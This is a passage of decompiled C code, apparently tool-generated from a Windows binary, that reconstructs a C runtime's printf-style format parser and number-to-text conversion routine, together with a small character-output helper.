        int32_t v84 = v83 / 16; // 0x4016e6
        g107 = v84;
        v18 = v37;
        v17 = v84;
        v29 = v28;
        v66 = v63;
        v61 = v59;
        v47 = v46;
        v44 = v41;
        v73 = v72;
        v51 = v49;
        v70 = v68;
        v26 = v24;
        v35 = v34;
        v57 = v54;
        v15 = v22;
        switch (v84) {
            case 0: {
                goto lab_0x40182c;
            }
            case 1: {
                // 0x4016fc
                v18 = v37;
                v17 = 1;
                v29 = -1;
                v66 = 0;
                v61 = 0;
                v47 = 0;
                v44 = 0;
                v73 = 0;
                v51 = 0;
                v70 = v68;
                v26 = v24;
                v35 = v34;
                v57 = v54;
                v15 = v22;
                goto lab_0x401dde;
            }
            case 2: {
                switch (0x1000000 * v19) {
                    case 0x20000000: {
                        // 0x40175c
                        v18 = v37;
                        v17 = 2;
                        v29 = v28;
                        v66 = v63;
                        v61 = v59;
                        v47 = v46;
                        v44 = v41;
                        v73 = v72 | 2;
                        v51 = v49;
                        v70 = v68;
                        v26 = v24;
                        v35 = v34;
                        v57 = v54;
                        v15 = v22;
                        // break -> 0x401dde
                        break;
                    }
                    case 0x23000000: {
                        // 0x401753
                        v18 = v37;
                        v17 = 2;
                        v29 = v28;
                        v66 = v63;
                        v61 = v59;
                        v47 = v46;
                        v44 = v41;
                        v73 = v72 | -128;
                        v51 = v49;
                        v70 = v68;
                        v26 = v24;
                        v35 = v34;
                        v57 = v54;
                        v15 = v22;
                        // break -> 0x401dde
                        break;
                    }
                    case 0x2b000000: {
                        // 0x40174a
                        v18 = v37;
                        v17 = 2;
                        v29 = v28;
                        v66 = v63;
                        v61 = v59;
                        v47 = v46;
                        v44 = v41;
                        v73 = v72 | 1;
                        v51 = v49;
                        v70 = v68;
                        v26 = v24;
                        v35 = v34;
                        v57 = v54;
                        v15 = v22;
                        // break -> 0x401dde
                        break;
                    }
                    default: {
                        int32_t v85 = (int32_t)v20 - 45; // 0x40172c
                        if (v85 == 0) {
                            // 0x401741
                            v18 = v37;
                            v17 = 2;
                            v29 = v28;
                            v66 = v63;
                            v61 = v59;
                            v47 = v46;
                            v44 = v41;
                            v73 = v72 | 4;
                            v51 = v49;
                            v70 = v68;
                            v26 = v24;
                            v35 = v34;
                            v57 = v54;
                            v15 = v22;
                        } else {
                            // 0x40172f
                            v18 = v37;
                            v17 = 2;
                            v29 = v28;
                            v66 = v63;
                            v61 = v59;
                            v47 = v46;
                            v44 = v41;
                            v73 = v85 != 3 ? v72 : v72 | 8;
                            v51 = v49;
                            v70 = v68;
                            v26 = v24;
                            v35 = v34;
                            v57 = v54;
                            v15 = v22;
                        }
                        // break -> 0x401dde
                        break;
                    }
                }
                goto lab_0x401dde;
            }
            case 3: {
                if (v20 != 42) {
                    // 0x40178d
                    v18 = v37;
                    v17 = 3;
                    v29 = v28;
                    v66 = v63;
                    v61 = v59;
                    v47 = (int32_t)v20 - 48 + 10 * v46;
                    v44 = v41;
                    v73 = v72;
                    v51 = v49;
                    v70 = v68;
                    v26 = v24;
                    v35 = v34;
                    v57 = v54;
                    v15 = v22;
                } else {
                    // 0x40176a
                    *(int32_t *)(v22 - 4) = v3;
                    int32_t v86 = function_401eb5(3); // 0x40176e
                    v18 = v37;
                    v17 = 3;
                    v29 = v28;
                    v66 = v63;
                    v61 = v59;
                    v47 = v86;
                    v44 = v41;
                    v73 = v72;
                    v51 = v49;
                    v70 = v68;
                    v26 = v24;
                    v35 = v34;
                    v57 = v54;
                    v15 = v22;
                    if (v86 < 0) {
                        // 0x40177f
                        v18 = v37;
                        v17 = 3;
                        v29 = v28;
                        v66 = v63;
                        v61 = v59;
                        v47 = -v86;
                        v44 = v41;
                        v73 = v72 | 4;
                        v51 = v49;
                        v70 = v68;
                        v26 = v24;
                        v35 = v34;
                        v57 = v54;
                        v15 = v22;
                    }
                }
                goto lab_0x401dde;
            }
            case 4: {
                // 0x40179c
                v18 = v37;
                v17 = 4;
                v29 = 0;
                v66 = v63;
                v61 = v59;
                v47 = v46;
                v44 = v41;
                v73 = v72;
                v51 = v49;
                v70 = v68;
                v26 = v24;
                v35 = v34;
                v57 = v54;
                v15 = v22;
                goto lab_0x401dde;
            }
            case 5: {
                if (v20 != 42) {
                    // 0x4017c8
                    v18 = v37;
                    v17 = 5;
                    v29 = (int32_t)v20 - 48 + 10 * v28;
                    v66 = v63;
                    v61 = v59;
                    v47 = v46;
                    v44 = v41;
                    v73 = v72;
                    v51 = v49;
                    v70 = v68;
                    v26 = v24;
                    v35 = v34;
                    v57 = v54;
                    v15 = v22;
                } else {
                    // 0x4017aa
                    *(int32_t *)(v22 - 4) = v3;
                    int32_t v87 = function_401eb5(5); // 0x4017ae
                    v18 = v37;
                    v17 = 5;
                    v29 = v87 >= 0 ? v87 : -1;
                    v66 = v63;
                    v61 = v59;
                    v47 = v46;
                    v44 = v41;
                    v73 = v72;
                    v51 = v49;
                    v70 = v68;
                    v26 = v24;
                    v35 = v34;
                    v57 = v54;
                    v15 = v22;
                }
                goto lab_0x401dde;
            }
            case 6: {
                switch (v20) {
                    case 73: {
                        // 0x40180f
                        if (*v24 != 54) {
                            goto lab_0x40182c;
                        } else {
                            // 0x401814
                            if (*(char *)(v25 + 2) != 52) {
                                goto lab_0x40182c;
                            } else {
                                // 0x40181a
                                v18 = v37;
                                v17 = 6;
                                v29 = v28;
                                v66 = v63;
                                v61 = v59;
                                v47 = v46;
                                v44 = v41;
                                v73 = v72;
                                v51 = v49;
                                v70 = v68 | -128;
                                v26 = (char *)(v25 + 3);
                                v35 = v34;
                                v57 = v54;
                                v15 = v22;
                                goto lab_0x401dde;
                            }
                        }
                    }
                    case 104: {
                        // 0x401806
                        v18 = v37;
                        v17 = 6;
                        v29 = v28;
                        v66 = v63;
                        v61 = v59;
                        v47 = v46;
                        v44 = v41;
                        v73 = v72 | 32;
                        v51 = v49;
                        v70 = v68;
                        v26 = v24;
                        v35 = v34;
                        v57 = v54;
                        v15 = v22;
                        goto lab_0x401dde;
                    }
                    case 108: {
                        // 0x4017fd
                        v18 = v37;
                        v17 = 6;
                        v29 = v28;
                        v66 = v63;
                        v61 = v59;
                        v47 = v46;
                        v44 = v41;
                        v73 = v72 | 16;
                        v51 = v49;
                        v70 = v68;
                        v26 = v24;
                        v35 = v34;
                        v57 = v54;
                        v15 = v22;
                        goto lab_0x401dde;
                    }
                    default: {
                        int16_t v88 = v20 != 119 ? v72 : v72 | 2048;
                        v18 = v37;
                        v17 = 6;
                        v29 = v28;
                        v66 = v63;
                        v61 = v59;
                        v47 = v46;
                        v44 = v41;
                        v73 = v88;
                        v51 = v49;
                        v70 = v68;
                        v26 = v24;
                        v35 = v34;
                        v57 = v54;
                        v15 = v22;
                        goto lab_0x401dde;
                    }
                }
            }
            case 7: {
                int32_t v89 = 0x1000000 * v19;
                if (v89 > 0x67000000) {
                    // 0x401ab5
                    v74 = v72;
                    v30 = 8;
                    v78 = 7;
                    v38 = 10;
                    v31 = v28;
                    v42 = v41;
                    v76 = v72;
                    v55 = v54;
                    switch ((char)((v89 - 0x69000000) / 0x1000000)) {
                        case 0: {
                            goto lab_0x401b8e;
                        }
                        case 5: {
                            // 0x401b64
                            *(int32_t *)(v22 - 4) = v3;
                            int32_t v90 = function_401eb5(7); // 0x401b68
                            if ((v72 & 32) == 0) {
                                // 0x401b7d
                                *(int32_t *)v90 = result;
                                v18 = v37;
                                v17 = 7;
                                v29 = v28;
                                v66 = v63;
                                v61 = 1;
                                v47 = v46;
                                v44 = v41;
                                v73 = v72;
                                v51 = v49;
                                v70 = v68;
                                v26 = v24;
                                v35 = v34;
                                v57 = v54;
                                v15 = v22;
                            } else {
                                // 0x401b74
                                *(int16_t *)v90 = (int16_t)result;
                                v18 = v37;
                                v17 = 7;
                                v29 = v28;
                                v66 = v63;
                                v61 = 1;
                                v47 = v46;
                                v44 = v41;
                                v73 = v72;
                                v51 = v49;
                                v70 = v68;
                                v26 = v24;
                                v35 = v34;
                                v57 = v54;
                                v15 = v22;
                            }
                            goto lab_0x401dde;
                        }
                        case 6: {
                            // 0x401b52
                            v38 = 8;
                            v31 = v28;
                            v42 = v41;
                            v76 = v72;
                            v55 = v54;
                            goto lab_0x401b99;
                        }
                        case 7: {
                            goto lab_0x401b30;
                        }
                        case 10: {
                            goto lab_0x4018ba;
                        }
                        case 12: {
                            goto lab_0x401b99;
                        }
                        default: {
                            // 0x401ae2
                            v30 = v28;
                            v78 = 39;
                            if (v20 != 120) {
                                goto lab_0x401ccd;
                            } else {
                                goto lab_0x401b30;
                            }
                        }
                    }
                } else {
                    // 0x40187d
                    v64 = v63;
                    v21 = v19;
                    if (v89 > 0x64000000) {
                        goto lab_0x40191c;
                    } else {
                        int32_t v91 = v20; // 0x401871
                        if (v89 > 0x58000000) {
                            if (v20 == 90) {
                                // 0x4019b2
                                v79 = v22 - 4;
                                v80 = (int32_t *)v79;
                                *v80 = v3;
                                int32_t v92 = function_401eb5(7); // 0x4019b6
                                if (v92 == 0) {
                                    goto lab_0x4019f2;
                                } else {
                                    int32_t v93 = *(int32_t *)(v92 + 4); // 0x4019c0
                                    if (v93 == 0) {
                                        goto lab_0x4019f2;
                                    } else {
                                        if ((v72 & 2048) == 0) {
                                            int16_t v94 = *(int16_t *)v92; // 0x4019ea
                                            v39 = v94;
                                            v52 = 0;
                                            v32 = v28;
                                            v65 = v63;
                                            v60 = v59;
                                            v43 = v41;
                                            v77 = v72;
                                            v50 = 0;
                                            v69 = v68;
                                            v36 = (char (*)[7])v93;
                                            v56 = v54;
                                            v23 = v22;
                                        } else {
                                            int16_t v95 = *(int16_t *)v92; // 0x4019cc
                                            v39 = (int32_t)v95 / 2;
                                            v52 = 0;
                                            v32 = v28;
                                            v65 = v63;
                                            v60 = v59;
                                            v43 = v41;
                                            v77 = v72;
                                            v50 = 1;
                                            v69 = v68;
                                            v36 = (char (*)[7])v93;
                                            v56 = v54;
                                            v23 = v22;
                                        }
                                        goto lab_0x401ccd;
                                    }
                                }
                            } else {
                                // 0x401980
                                v75 = v72;
                                v39 = v37;
                                v52 = 0;
                                v32 = v28;
                                v65 = v63;
                                v60 = v59;
                                v43 = v41;
                                v77 = v72;
                                v50 = v49;
                                v69 = v68;
                                v36 = v34;
                                v56 = v54;
                                v23 = v22;
                                switch (v91) {
                                    case 99: {
                                        goto lab_0x40194a;
                                    }
                                    case 100: {
                                        goto lab_0x401b8e;
                                    }
                                    default: {
                                        goto lab_0x401ccd;
                                    }
                                }
                            }
                        } else {
                            // 0x40188f
                            v30 = v28;
                            v78 = 7;
                            switch (v89) {
                                case 0x58000000: {
                                    goto lab_0x401b30;
                                }
                                case 0x43000000: {
                                    int16_t v96 = (v72 & 2096) != 0 ? v72 : v72 | 2048;
                                    v75 = v96;
                                    goto lab_0x40194a;
                                }
                                case 0x45000000: {
                                    // 0x401912
                                    v64 = 1;
                                    v21 = v20 + 32;
                                    goto lab_0x40191c;
                                }
                                default: {
                                    int32_t v97 = v91 - 71; // 0x4018a3
                                    if (v97 == 0) {
                                        // 0x401912
                                        v64 = 1;
                                        v21 = v20 + 32;
                                        goto lab_0x40191c;
                                    } else {
                                        // 0x4018a6
                                        v39 = v37;
                                        v52 = 0;
                                        v32 = v28;
                                        v65 = v63;
                                        v60 = v59;
                                        v43 = v41;
                                        v77 = v72;
                                        v50 = v49;
                                        v69 = v68;
                                        v36 = v34;
                                        v56 = v54;
                                        v23 = v22;
                                        if (v97 != 12) {
                                            goto lab_0x401ccd;
                                        } else {
                                            int16_t v98 = (v72 & 2096) != 0 ? v72 : v72 | 2048;
                                            v74 = v98;
                                            goto lab_0x4018ba;
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
            default: {
                goto lab_0x401dde;
            }
        }
    }
  lab_0x401dde_2:
    // 0x401def
    return result;
  lab_0x40182c:;
    int32_t * v99 = (int32_t *)(v22 - 4);
    int32_t * v100; // 0x401679
    int32_t * v101; // 0x401679
    int32_t v102; // 0x401679
    char * v103; // 0x401679
    if (*(char *)(*(int32_t *)0x4084a8 + (2 * v19 || 1)) > -1) {
        // 0x40182c
        v101 = (int32_t *)(v22 - 12);
        v100 = (int32_t *)(v22 - 8);
        v103 = v24;
        v102 = v19;
    } else {
        // 0x401840
        *v99 = v8;
        int32_t * v104 = (int32_t *)(v22 - 8);
        *v104 = a1;
        int32_t * v105 = (int32_t *)(v22 - 12);
        *v105 = (int32_t)v20;
        function_401e17(0, (int32_t)&g110, (int32_t)&g110);
        v101 = v105;
        v100 = v104;
        v103 = (char *)(v25 + 2);
        v102 = (int32_t)*v24;
    }
    // 0x401859
    *v99 = v8;
    *v100 = a1;
    *v101 = 0x1000000 * v102 / 0x1000000;
    function_401e17((int32_t)v103, (int32_t)&g110, (int32_t)&g110);
    v18 = v37;
    v17 = 0;
    v29 = v28;
    v66 = v63;
    v61 = v59;
    v47 = v46;
    v44 = v41;
    v73 = v72;
    v51 = 0;
    v70 = v68;
    v26 = v103;
    v35 = v34;
    v57 = v54;
    v15 = v22;
    goto lab_0x401dde;
  lab_0x401dde:
    // 0x401dde
    v16 = *v26;
    if (v16 == 0) {
        // break -> 0x401dde
        goto lab_0x401dde_2;
    }
    // 0x4016ad
    v13 = (int32_t)v26;
    v53 = v57;
    v33 = v35;
    v67 = v70;
    v48 = v51;
    v71 = v73;
    v40 = v44;
    v45 = v47;
    v58 = v61;
    v62 = v66;
    v27 = v29;
    if (result < 0) {
        // 0x401def
        return result;
    }
    goto lab_0x4016c4;
  lab_0x401b8e:
    // 0x401b8e
    v38 = 10;
    v31 = v28;
    v42 = v41;
    v76 = v72 | 64;
    v55 = v54;
    goto lab_0x401b99;
  lab_0x401b30:;
    int32_t v203 = v78;
    int32_t v204 = v30;
    v38 = 16;
    v31 = v204;
    v42 = v41;
    v76 = v72;
    v55 = v203;
    if ((char)v72 <= 255) {
        // 0x401b3d
        v9 = 48;
        v38 = 16;
        v31 = v204;
        v42 = 2;
        v76 = v72;
        v55 = v203;
    }
    goto lab_0x401b99;
  lab_0x4018ba:;
    int16_t v205 = v74;
    int32_t v206 = v28 == -1 ? 0x7fffffff : v28;
    *(int32_t *)(v22 - 4) = v3;
    int32_t v207 = function_401eb5((int32_t)&g110); // 0x4018cc
    char (*v208)[7] = (char (*)[7])v207; // 0x4018da
    if ((v205 & 2064) == 0) {
        int32_t v209 = v207 != 0 ? v207 : (int32_t)g15;
        int32_t v210 = v206; // 0x401b11
        int32_t v211 = v209; // 0x401b11
        int32_t v212 = v209; // 0x401b11
        if (v206 != 0) {
            int32_t v213 = v211;
            v212 = v213;
            while (*(char *)v213 != 0) {
                int32_t v214 = v210 - 1;
                int32_t v215 = v213 + 1; // 0x401b18
                v210 = v214;
                v211 = v215;
                v212 = v215;
                if (v214 == 0) {
                    // break -> 0x401b1b
                    break;
                }
                v213 = v211;
                v212 = v213;
            }
        }
        // 0x401b1b
        v39 = v212 - v209;
        v52 = 0;
        v32 = v28;
        v65 = v63;
        v60 = v59;
        v43 = v41;
        v77 = v205;
        v50 = v49;
        v69 = v68;
        v36 = v207 != 0 ? v208 : g15;
        v56 = v54;
        v23 = v22;
    } else {
        char (*v216)[7] = v208; // 0x4018e5
        int32_t v217 = v207; // 0x4018e5
        if (v207 == 0) {
            // 0x4018e7
            v217 = *(int32_t *)0x4080cc;
            v216 = (char (*)[7])v217;
        }
        int32_t v218 = v206; // 0x4018fe
        int32_t v219 = v217; // 0x4018fe
        int32_t v220 = v217; // 0x4018fe
        if (v206 != 0) {
            int32_t v221 = v219;
            v220 = v221;
            while (*(int16_t *)v221 != 0) {
                int32_t v222 = v218 - 1;
                int32_t v223 = v221 + 2; // 0x40190f
                v218 = v222;
                v219 = v223;
                v220 = v223;
                if (v222 == 0) {
                    // break -> 0x401af4
                    break;
                }
                v221 = v219;
                v220 = v221;
            }
        }
        // 0x401af4
        v39 = (v220 - v217) / 2;
        v52 = 0;
        v32 = v28;
        v65 = v63;
        v60 = v59;
        v43 = v41;
        v77 = v205;
        v50 = 1;
        v69 = v68;
        v36 = v216;
        v56 = v54;
        v23 = v22;
    }
    goto lab_0x401ccd;
  lab_0x401b99:;
    int32_t v106 = v55;
    int16_t v107 = v76;
    int32_t v108 = v31;
    int32_t v109 = v38;
    int16_t v110; // 0x401679
    int32_t v111; // 0x401679
    int32_t v112; // 0x401679
    int32_t v113; // 0x401679
    int32_t v114; // 0x401679
    char v115; // 0x401679
    int32_t v116; // 0x401679
    int16_t v117; // 0x401679
    if (v68 > -1) {
        // 0x401bab
        v117 = v107 & 64;
        *(int32_t *)(v22 - 4) = v3;
        int32_t v118 = function_401eb5(v109);
        if ((v107 & 32) == 0) {
            // 0x401bd2
            v111 = v118;
            v115 = v68;
            v114 = v118;
            v116 = 0;
            if (v117 == 0) {
                goto lab_0x401c15;
            } else {
                goto lab_0x401bc4;
            }
        } else {
            if (v117 == 0) {
                // 0x401bc7
                v111 = v118 & 0xffff;
            } else {
                // 0x401bbb
                v111 = 0x10000 * v118 / 0x10000;
            }
            goto lab_0x401bc4;
        }
    } else {
        // 0x401b9f
        *(int32_t *)(v22 - 4) = v3;
        v110 = v107 & 64;
        v112 = function_401ec2(v109);
        v113 = 512;
        goto lab_0x401bec;
    }
  lab_0x40191c:;
    int32_t v119 = v21;
    int32_t v120 = 6; // 0x40192d
    if (v28 >= 0) {
        if (v28 != 0) {
            // 0x401a10
            v120 = v28;
            if ((v28 < 512 ? v28 : 512) >= 164) {
                // 0x401a21
                uint32_t v121; // 0x401679
                *(int32_t *)(v22 - 4) = v121 + 349;
                int32_t v122 = _malloc(7) == NULL ? 163 : v121;
                v120 = v122;
            }
        } else {
            // 0x401a02
            v120 = v119 != 103 ? v28 : 1;
        }
    }
    int32_t v123 = v1; // 0x401a45
    int32_t v124 = v22 - 4; // 0x401a48
    int32_t * v125 = (int32_t *)v124; // 0x401a48
    *v125 = v64;
    v1 = v123 + 8;
    *(int32_t *)(v22 - 8) = v120;
    v6 = *(int32_t *)v123;
    *(int32_t *)(v22 - 12) = 0x1000000 * v119 / 0x1000000;
    *(int32_t *)(v22 - 16) = v5;
    *(int32_t *)(v22 - 20) = v7;
    function_405a09();
    if ((char)v72 <= -1 && v120 == 0) {
        // 0x401a83
        *v125 = v5;
        function_405a09();
    }
    if ((char)v72 > -1 == v119 == 103) {
        // 0x401a94
        *v125 = v5;
        function_405a09();
    }
    char v126 = *(char *)v5; // 0x401a9c
    int32_t v127 = v5 + 1;
    *v125 = v126 != 45 ? v5 : v127;
    int32_t v128 = 0; // 0x401aa9
    int32_t v129 = v120; // 0x401aa9
    int32_t v130 = v64; // 0x401aa9
    int16_t v131 = v72 | 64; // 0x401aa9
    char v132 = v68 | (char)(v126 == 45); // 0x401aa9
    char (*v133)[7] = v126 != 45 ? (char (*)[7])&v4 : (char (*)[7])v127; // 0x401aa9
    int32_t v134 = v124; // 0x401aa9
    goto lab_0x401aaa;
  lab_0x401ccd:;
    int32_t v135 = v23;
    int32_t v136 = v56;
    char (*v137)[7] = v36;
    char v138 = v69;
    int32_t v139 = v50;
    int16_t v140 = v77;
    int32_t v141 = v43;
    int32_t v142 = v60;
    int32_t v143 = v65;
    int32_t v144 = v32;
    int32_t v145 = v52;
    int32_t v146 = v39;
    int32_t v147 = v141; // 0x401cd1
    if (v142 == 0) {
        int32_t v148 = v140; // 0x401cd7
        int32_t v149 = v141; // 0x401cdd
        if ((v140 & 64) != 0) {
            if ((v148 & 256) == 0) {
                if ((v148 & 1) == 0) {
                    // 0x401cf5
                    v149 = v141;
                    if ((v148 & 2) != 0) {
                        // 0x401cfa
                        v9 = 32;
                        v149 = 1;
                    }
                } else {
                    // 0x401cef
                    v9 = 43;
                    v149 = 1;
                }
            } else {
                // 0x401ce4
                v9 = 45;
                v149 = 1;
            }
        }
        int32_t v150 = v149;
        int32_t v151 = v46 - v150 - v146; // 0x401d0b
        int32_t * v152 = (int32_t *)(v135 - 4);
        int32_t * v153; // 0x401679
        int32_t * v154; // 0x401679
        int32_t * v155; // 0x401679
        if ((v148 & 12) != 0) {
            // 0x401d05
            v155 = (int32_t *)(v135 - 16);
            v154 = (int32_t *)(v135 - 12);
            v153 = (int32_t *)(v135 - 8);
        } else {
            // 0x401d13
            *v152 = v8;
            int32_t * v156 = (int32_t *)(v135 - 8);
            *v156 = a1;
            int32_t * v157 = (int32_t *)(v135 - 12);
            *v157 = v151;
            int32_t * v158 = (int32_t *)(v135 - 16);
            *v158 = 32;
            function_401e4c((int32_t)&g110, (int32_t)&g110);
            v155 = v158;
            v154 = v157;
            v153 = v156;
        }
        int32_t * v159 = v153;
        int32_t * v160 = v154;
        int32_t * v161 = v155;
        *v152 = v8;
        *v159 = a1;
        *v160 = v150;
        *v161 = v10;
        function_401e7d((int32_t)&g110, (int32_t)&g110, (int32_t)&g110);
        if ((v148 & 8) != 0) {
            if ((v148 & 4) == 0) {
                // 0x401d45
                *v152 = v8;
                *v159 = a1;
                *v160 = v151;
                *v161 = 48;
                function_401e4c((int32_t)&g110, (int32_t)&g110);
            }
        }
        if (v146 < 1 || v139 == 0) {
            // 0x401d9e
            *v152 = v8;
            *v159 = a1;
            *v160 = v146;
            *v161 = (int32_t)v137;
            function_401e7d((int32_t)&g110, (int32_t)&g110, (int32_t)&g110);
        } else {
            int32_t v162 = (int32_t)v137;
            int32_t v163 = v146;
            *v152 = v163 & -0x10000 | (int32_t)*(int16_t *)v162;
            *v159 = v12;
            int32_t v164 = function_4038bb((int32_t)&g110, (int32_t)&g110); // 0x401d76
            while (v164 >= 1) {
                int32_t v165 = v163 - 1;
                *v152 = v8;
                *v159 = a1;
                *v160 = v164;
                *v161 = v12;
                function_401e7d((int32_t)&g110, (int32_t)&g110, (int32_t)&g110);
                int32_t v166 = v162 + 2; // 0x401d9a
                if (v165 == 0) {
                    // break -> 0x401db3
                    break;
                }
                v162 = v166;
                v163 = v165;
                *v152 = v163 & -0x10000 | (int32_t)*(int16_t *)v162;
                *v159 = v12;
                v164 = function_4038bb((int32_t)&g110, (int32_t)&g110);
            }
        }
        // 0x401db3
        v147 = v150;
        if ((v140 & 4) != 0) {
            // 0x401db9
            *v152 = v8;
            *v159 = a1;
            *v160 = v151;
            *v161 = 32;
            function_401e4c((int32_t)&g110, (int32_t)&g110);
            v147 = v150;
        }
    }
    int32_t v167 = v147;
    v18 = v146;
    v17 = 7;
    v29 = v144;
    v66 = v143;
    v61 = v142;
    v47 = v46;
    v44 = v167;
    v73 = v140;
    v51 = v139;
    v70 = v138;
    v26 = v24;
    v35 = v137;
    v57 = v136;
    v15 = v135;
    if (v145 != 0) {
        // 0x401dd1
        *(int32_t *)(v135 - 4) = v145;
        function_401f99((int32_t)&g110);
        v18 = v146;
        v17 = 7;
        v29 = v144;
        v66 = v143;
        v61 = v142;
        v47 = v46;
        v44 = v167;
        v73 = v140;
        v51 = v139;
        v70 = v138;
        v26 = v24;
        v35 = v137;
        v57 = v136;
        v15 = v135;
    }
    goto lab_0x401dde;
  lab_0x401aaa:
    // 0x401aaa
    v39 = function_403840((int32_t)&g110);
    v52 = v128;
    v32 = v129;
    v65 = v130;
    v60 = v59;
    v43 = v41;
    v77 = v131;
    v50 = v49;
    v69 = v132;
    v36 = v133;
    v56 = v54;
    v23 = v134 + 4;
    goto lab_0x401ccd;
  lab_0x401bec:;
    int32_t v168 = v113;
    int32_t v169 = v112;
    v115 = v68;
    v114 = v169;
    v116 = v168;
    if (v110 != 0) {
        // 0x401bf2
        v115 = v68;
        v114 = v169;
        v116 = v168;
        if (v168 < 0 && v168 >= 0 != v168 != 0) {
            // 0x401bfc
            v115 = v68 | 1;
            v114 = -v169;
            v116 = -((v168 + (int32_t)(v169 != 0)));
        }
    }
    goto lab_0x401c15;
  lab_0x401c15:;
    char v170 = v115;
    int32_t v171 = 1; // 0x401c23
    int16_t v172 = v107; // 0x401c23
    if (v108 >= 0) {
        // 0x401c2e
        v171 = v108 < 512 ? v108 : 512;
        v172 = v107 & -9;
    }
    int32_t v173 = v170 <= -1 ? v116 : 0;
    int16_t v174 = v172;
    int32_t v175 = v171;
    int32_t v176 = v175 - 1; // 0x401c54
    int32_t v177 = v176; // 0x401c59
    int32_t v178 = v22; // 0x401c59
    int32_t v179 = v173; // 0x401c59
    int32_t v180 = v114; // 0x401c59
    int32_t v181; // bp-81, 0x401679
    char (*v182)[7] = (char (*)[7])&v181; // 0x401c59
    char (*v183)[7] = (char (*)[7])&v181; // 0x401c59
    int32_t v184 = v22; // 0x401c59
    int32_t v185 = v176; // 0x401c59
    if ((v173 || v114) == 0 != v175 >= 0 != v175 != 0) {
        int32_t v186 = v177;
        *(int32_t *)(v178 - 4) = 0;
        *(int32_t *)(v178 - 8) = v109;
        *(int32_t *)(v178 - 12) = v179;
        *(int32_t *)(v178 - 16) = v180;
        int32_t v187 = __aullrem(v180, v179); // 0x401c73
        *(int32_t *)(v178 - 20) = 0;
        *(int32_t *)(v178 - 24) = v109;
        *(int32_t *)(v178 - 28) = v179;
        int32_t v188 = v187 + 48; // 0x401c7f
        int32_t v189 = v178 - 32; // 0x401c82
        *(int32_t *)v189 = v180;
        int32_t v190 = __aulldiv(); // 0x401c85
        char (*v191)[7] = (char (*)[7])((int32_t)v182 - 1);
        v182[0] = (char)((v188 < 58 ? 0 : v106) + v188);
        int32_t v192 = v186 - 1; // 0x401c54
        v178 = v189;
        v179 = 0;
        v180 = v190;
        v182 = v191;
        v183 = v191;
        v184 = v189;
        v185 = v192;
        while (v186 >= 0 != v186 != 0 != (v190 == 0)) {
            // 0x401c63
            v186 = v192;
            *(int32_t *)(v178 - 4) = 0;
            *(int32_t *)(v178 - 8) = v109;
            *(int32_t *)(v178 - 12) = v179;
            *(int32_t *)(v178 - 16) = v180;
            v187 = __aullrem(v180, v179);
            *(int32_t *)(v178 - 20) = 0;
            *(int32_t *)(v178 - 24) = v109;
            *(int32_t *)(v178 - 28) = v179;
            v188 = v187 + 48;
            v189 = v178 - 32;
            *(int32_t *)v189 = v180;
            v190 = __aulldiv();
            v191 = (char (*)[7])((int32_t)v182 - 1);
            v182[0] = (char)((v188 < 58 ? 0 : v106) + v188);
            v192 = v186 - 1;
            v178 = v189;
            v179 = 0;
            v180 = v190;
            v182 = v191;
            v183 = v191;
            v184 = v189;
            v185 = v192;
        }
    }
    int32_t v193 = (v173 | v114) != 0 ? v42 : 0;
    int32_t v194 = v185;
    int32_t v195 = v184;
    char (*v196)[7] = v183;
    int32_t v197 = (int32_t)v196; // 0x401ca5
    int32_t v198 = (int32_t)&v181 - v197; // 0x401ca5
    char (*v199)[7] = (char (*)[7])(v197 + 1); // 0x401ca8
    v39 = v198;
    v52 = 0;
    v32 = v194;
    v65 = v63;
    v60 = v59;
    v43 = v193;
    v77 = v174;
    v50 = v49;
    v69 = v170;
    v36 = v199;
    v56 = v106;
    v23 = v195;
    if ((v170 & 2) != 0) {
        // 0x401cb4
        v39 = v198;
        v52 = 0;
        v32 = v194;
        v65 = v63;
        v60 = v59;
        v43 = v193;
        v77 = v174;
        v50 = v49;
        v69 = v170;
        v36 = v199;
        v56 = v106;
        v23 = v195;
        if (v198 != 0 != (v199[0] == 48)) {
            // 0x401cc0
            v196[0] = 48;
            v39 = v198 + 1;
            v52 = 0;
            v32 = v194;
            v65 = v63;
            v60 = v59;
            v43 = v193;
            v77 = v174;
            v50 = v49;
            v69 = v170;
            v36 = v196;
            v56 = v106;
            v23 = v195;
        }
    }
    goto lab_0x401ccd;
  lab_0x401bc4:
    // 0x401bc4
    v110 = v117;
    v112 = v111;
    v113 = v111 >> 31;
    goto lab_0x401bec;
  lab_0x4019f2:;
    char (*v200)[7] = g15; // 0x4019f2
    *v80 = (int32_t)v200;
    v128 = 0;
    v129 = v28;
    v130 = v63;
    v131 = v72;
    v132 = v68;
    v133 = v200;
    v134 = v79;
    goto lab_0x401aaa;
  lab_0x40194a:;
    int16_t v201 = v75;
    *(int32_t *)(v22 - 4) = v3;
    if ((v201 & 2064) == 0) {
        // 0x401991
        v4 = 0x1000000 * function_401eb5((int32_t)&g110) / 0x1000000;
        v39 = 1;
        v52 = 0;
        v32 = v28;
        v65 = v63;
        v60 = v59;
        v43 = v41;
        v77 = v201;
        v50 = v49;
        v69 = v68;
        v36 = (char (*)[7])&v4;
        v56 = v54;
        v23 = v22;
    } else {
        // 0x401956
        *(int32_t *)(v22 - 8) = function_401ed2((int32_t)&g110);
        *(int32_t *)(v22 - 12) = v5;
        int32_t v202 = function_4038bb((int32_t)&g110, (int32_t)&g110); // 0x401963
        v39 = v202;
        v52 = 0;
        v32 = v28;
        v65 = v63;
        v60 = v202 >= 0 ? v59 : 1;
        v43 = v41;
        v77 = v201;
        v50 = v49;
        v69 = v68;
        v36 = (char (*)[7])&v4;
        v56 = v54;
        v23 = v22;
    }
    goto lab_0x401ccd;
}

// Address range: 0x401e17 - 0x401e4c
int32_t function_401e17(int32_t a1, int32_t a2, int32_t result) {
    int32_t v1 = 0x1000000 * a1 / 0x1000000;
    int32_t * v2 = (int32_t *)(a2 + 4); // 0x401e1d
    uint32_t v3 = *v2 - 1; // 0x401e1d
    *v2 = v3;
    int32_t * v4; // 0x401e17
    if (v3 >= 0) {
        int32_t * v5 = (int32_t *)a2; // 0x401e22
        *(char *)*v5 = (char)v1;
        *v5 = *v5 + 1;
        // 0x401e48
        v4 = (int32_t *)result;
        *v4 = *v4 + 1;
        return result;
    }
    int32_t * v6 = (int32_t *)result;
    if (function_4021ed(v1, a2) == -1) {
        // 0x401e43
        *v6 = -1;
        return result;
    }
    // 0x401e48
    v4 = v6;
    *v4 = *v4 + 1;
    return result;
}

// Address range: 0x401e4c - 0x401e7d
int32_t function_401e4c(int32_t result, int32_t a2) {
    // 0x401e4c
    if (result < 1) {
